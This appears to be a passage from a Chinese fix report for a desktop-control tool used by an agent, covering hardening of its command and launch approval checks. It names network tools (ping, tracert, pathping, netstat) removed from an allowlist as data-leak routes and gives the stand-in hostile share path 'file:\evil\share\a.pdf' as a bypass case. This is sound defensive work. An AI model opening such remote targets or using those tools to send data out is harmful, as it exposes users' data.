`ping` / `tracert` / `pathping` / `netstat` 都能做 DNS 解析或对外发包。上一轮把 `nslookup` 移出、却留下同类命令，标准不一致。全部移出只读白名单。

### 11.3 scheme 检测不再依赖 `://`

`file:\evil\share\a.pdf`（没有 `//`）之前被判成文档。改成匹配 `^[a-z][a-z0-9+.-]+:`（至少两个字符，避免把盘符 `C:` 当协议），除 `http(s)`、`mailto` 和显式协议列表外一律审批。

### 11.4 剪贴板改用格式枚举

`CountClipboardFormats() > 3` 这个阈值不可靠：应用只提交一种文本格式时，系统会自动合成 `CF_TEXT` / `CF_OEMTEXT` / `CF_UNICODETEXT` / `CF_LOCALE` 四个，阈值直接命中——结果是剪贴板粘贴法几乎从不触发。

改成 `ClipboardIsPlainText()`：用 `EnumClipboardFormats` 逐条判断，只允许 {1, 7, 13, 16}，出现其它格式一律视为有富内容、改走 unicode 注入。

### 11.5 `verify-package.mjs` 加强

评审指出两处太弱：

- **报告检查会回退到旧版本文件名** → 改成只认 `FIX-REPORT-v{version}.md`，找不到就红。
- **exe 检查用的标记字符串是 v1.1.1 就有的**（`后台模式不支持组合键`），旧 exe 也能过 → 改成 **mtime 对比**。方法名在 .NET 元数据里、不是字符串字面量，搜字节这件事 v1.1.3 就误判过一次。
- 新增断言：报告里「交付物」只允许出现一次（防止两个版本号并存）。

### 11.6 报告收尾

- 删掉重复的「交付物」结尾（v1.1.2 与 v1.1.3 两个版本号曾同时出现在文末）。
- 开头结论、总览表版本行更新到 1.1.4。
- 9.9 里写死的「44 条」去掉——13.3 说过「不再报会漂移的数字」，自己先违反了。

### 11.7 仍未修（新增三条）

评审这轮新指出的，一并记入：

- **输入文本仍会进 Win+V 剪贴板历史**：没设 `ExcludeClipboardContentFromMonitorProcessing` 这类排除格式，之前一直不在未修清单里。
- `+` 总是补 Shift：在 `+` 本身就是独立键的非美式键盘上，行为和预期不同。
- `PressCombo` 的 finally 只释放修饰键：主键「按下成功、松开失败」时仍会卡住。

连同前几轮的清单（`OSVersion`、`window.move` 默认值、`registry -Type`、`admin` 空格、`power sleep`、`#connect`、exe 非原子复制、`keyboard.type` 超时、`foregroundThread`、`AppList`、后台截图 DPI），都还在。

---

## 附录 · 关键位置索引

行号每轮都在漂移（评审已经指出过一次），所以这里只给**定位符号**，用 grep 或编辑器搜索即可，不会过期。

`index.js`（v1.1.3 共 1697 行）

| 定位符号 | 内容 |
|---|---|
| `function psArg` | base64 参数注入防护（返回值带括号） |
| `function psLiteral` | 内部路径字面量 |
| `const DEFAULT_ALLOWED_PROGRAMS` | 启动白名单 |
| `function classifyCommand` | 命令风险判定 |
| `function classifyLaunchArgs` | 启动参数风险 |
| `function classifyLaunch` | 启动目标白名单判定（UNC / 协议 / 文档） |
| `function resolveScreenshotPath` | 截图路径校验 |
| `function killTree` | 进程树终止（带 error 监听） |
| `function runPowerShellScript` | 命令执行 |
| `const runPointerBackground` | 后台鼠标 |
| `const runStep` | 批处理单步（含取消检查） |
| `const batchTool` | `pc_batch` 定义 |

`native/DesktopControl.cs`（v1.1.3 共 2256 行）

| 定位符号 | 内容 |
|---|---|
| `extern bool SetCursorPos` | 带 `SetLastError = true` |
| `MOUSEEVENTF_VIRTUALDESK` | 虚拟桌面绝对坐标 |
| `private static bool MoveCursorTo` | SendInput 优先 + 校验 + 兜底 |
| `private static object WindowFocus` | 前台激活（不还原最大化） |
| `private static object AppKill` | 全等匹配 + 自保护 |
| `private static bool IsProtectedForKill` | 保护 helper / 宿主 / 系统进程 |
| `private static object ClipboardGet` | `hasText` + 空值兜底 |
| `private static IntPtr FocusTarget` | 后台键盘投给焦点子控件 |
| `private static object BackgroundClick` | 子控件递归命中 |
| `private static object BackgroundPress` | 组合键明确报错 |
| `private static object BackgroundGrab` | 按目标 DPI 上下文截图 |

**交付物**：`desktop-control-v1.1.4-source.zip`。